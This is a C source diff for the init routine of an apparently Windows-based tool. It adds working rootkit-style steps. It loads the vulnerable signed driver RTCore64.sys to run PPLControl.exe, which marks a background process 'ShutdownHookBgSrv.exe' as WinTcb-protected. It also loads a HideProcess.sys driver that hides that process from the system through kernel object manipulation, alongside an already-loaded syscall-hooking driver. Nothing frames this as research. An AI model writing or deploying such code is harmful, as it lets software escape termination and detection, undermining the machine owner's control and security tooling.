@@ -707,7 +707,7 @@ static int CmdInit(VOID)
         printf("[OK] Auxiliary.sys loaded (InfinityHook syscall interceptor).\n");
         Sleep(1000);
 
-        /* 5. 设置 BgSrv PID + WinTCB 保护 + DKOM 隐藏 */
+        /* 5. 注册 BgSrv PID 到 Auxiliary (供系统调用拦截用) */
         HANDLE hAux = CreateFileW(AUX_WIN32_NAME, GENERIC_READ | GENERIC_WRITE,
                                     FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -718,31 +718,98 @@ static int CmdInit(VOID)
             DeviceIoControl(hAux, IOCTL_AUX_SET_BGSRV_PID, &pidHandle, sizeof(pidHandle),
                              NULL, 0, &auxBytes, NULL);
             printf("[OK] BgSrv PID registered with Auxiliary.\n");
-
-            /* 设置 WinTCB 保护 (PPL) */
-            AUX_PROTECTION_INPUT protIn;
-            protIn.Pid = pidHandle;
-            protIn.ProtectionLevel = PROTECTION_LEVEL_WINTCB;
-            if (DeviceIoControl(hAux, IOCTL_AUX_SET_PROTECTION, &protIn, sizeof(protIn),
-                                 NULL, 0, &auxBytes, NULL)) {
-                printf("[OK] BgSrv set to WinTCB protected (PPL).\n");
-            } else {
-                fprintf(stderr, "[WARN] Set WinTCB protection failed: %lu\n", GetLastError());
-            }
-
-            /* DKOM 隐藏 BgSrv */
-            AUX_HIDE_INPUT hideIn;
-            hideIn.Pid = pidHandle;
-            if (DeviceIoControl(hAux, IOCTL_AUX_HIDE_PROCESS, &hideIn, sizeof(hideIn),
-                                 NULL, 0, &auxBytes, NULL)) {
-                printf("[OK] BgSrv hidden via DKOM.\n");
-            } else {
-                fprintf(stderr, "[WARN] DKOM hide failed: %lu\n", GetLastError());
-            }
-
             CloseHandle(hAux);
         } else {
             fprintf(stderr, "[WARN] Cannot open Auxiliary device: %lu\n", GetLastError());
+        }
+    }
+
+    /* 6. PPL 保护 — 通过独立 PPLControl.exe 实现 (依赖 RTCore64.sys) */
+    {
+        WCHAR rtCorePath[MAX_PATH];
+        wcscpy_s(rtCorePath, MAX_PATH, driverPath);
+        WCHAR* rcSlash = wcsrchr(rtCorePath, L'\\');
+        if (rcSlash) *(rcSlash + 1) = L'\0';
+        wcscat_s(rtCorePath, MAX_PATH, L"RTCore64.sys");
+
+        int rcRtc = GdrvLoadDriver(rtCorePath);
+        if (rcRtc == 0) {
+            printf("[OK] RTCore64.sys loaded (PPLControl dependency).\n");
+            Sleep(500);
+
+            /* 运行 PPLControl.exe protect <pid> PPL WinTcb */
+            WCHAR pplExePath[MAX_PATH];
+            wcscpy_s(pplExePath, MAX_PATH, driverPath);
+            WCHAR* pplSlash = wcsrchr(pplExePath, L'\\');
+            if (pplSlash) *(pplSlash + 1) = L'\0';
+            wcscat_s(pplExePath, MAX_PATH, L"PPLcontrol.exe");
+
+            WCHAR cmdLine[MAX_PATH * 2];
+            swprintf_s(cmdLine, _countof(cmdLine),
+                       L"\"%s\" protect %lu PPL WinTcb", pplExePath, bgSrvPidVal);
+
+            STARTUPINFOW siPpl;
+            PROCESS_INFORMATION piPpl;
+            ZeroMemory(&siPpl, sizeof(siPpl));
+            siPpl.cb = sizeof(siPpl);
+            ZeroMemory(&piPpl, sizeof(piPpl));
+
+            if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
+                                CREATE_NO_WINDOW, NULL, NULL, &siPpl, &piPpl)) {
+                WaitForSingleObject(piPpl.hProcess, 10000);
+                DWORD exitCode = 1;
+                GetExitCodeProcess(piPpl.hProcess, &exitCode);
+                if (exitCode == 0) {
+                    printf("[OK] BgSrv set to WinTcb protected (PPL via PPLControl.exe).\n");
+                } else {
+                    fprintf(stderr, "[WARN] PPLControl.exe protect failed (exit code=%lu).\n", exitCode);
+                }
+                CloseHandle(piPpl.hThread);
+                CloseHandle(piPpl.hProcess);
+            } else {
+                fprintf(stderr, "[WARN] Could not run PPLControl.exe: %lu\n", GetLastError());
+            }
+        } else {
+            fprintf(stderr, "[WARN] GdrvLoadDriver(RTCore64) failed (code=%d). PPL protection skipped.\n", rcRtc);
+        }
+    }
+
+    /* 7. DKOM 进程隐藏 — 通过独立 HideProcessesDKOM.sys 实现 */
+    {
+        WCHAR dkomPath[MAX_PATH];
+        wcscpy_s(dkomPath, MAX_PATH, driverPath);
+        WCHAR* dkSlash = wcsrchr(dkomPath, L'\\');
+        if (dkSlash) *(dkSlash + 1) = L'\0';
+        wcscat_s(dkomPath, MAX_PATH, L"HideProcess.sys");
+
+        int rcDkom = GdrvLoadDriver(dkomPath);
+        if (rcDkom == 0) {
+            printf("[OK] HideProcess.sys loaded (DKOM process hider).\n");
+            Sleep(500);
+
+            /* 打开 \\.\HideProcess 设备，传入 BgSrv 进程名 */
+            HANDLE hDkom = CreateFileW(L"\\\\.\\HideProcess",
+                                         GENERIC_READ | GENERIC_WRITE,
+                                         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+                                         OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hDkom != INVALID_HANDLE_VALUE) {
+                char procName[] = "ShutdownHookBgSrv.exe";
+                DWORD bytesRet = 0;
+                /* IOCTL_GET_PROCESSNAME = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+                   = 0x000020C0 */
+                if (DeviceIoControl(hDkom, 0x000020C0,
+                                    procName, (DWORD)strlen(procName) + 1,
+                                    NULL, 0, &bytesRet, NULL)) {
+                    printf("[OK] BgSrv hidden via DKOM (HideProcess.sys).\n");
+                } else {
+                    fprintf(stderr, "[WARN] DKOM hide IOCTL failed: %lu\n", GetLastError());
+                }
+                CloseHandle(hDkom);
+            } else {
+                fprintf(stderr, "[WARN] Cannot open HideProcess device: %lu\n", GetLastError());
+            }
+        } else {
+            fprintf(stderr, "[WARN] GdrvLoadDriver(HideProcess) failed (code=%d). DKOM hide skipped.\n", rcDkom);
         }
     }
 
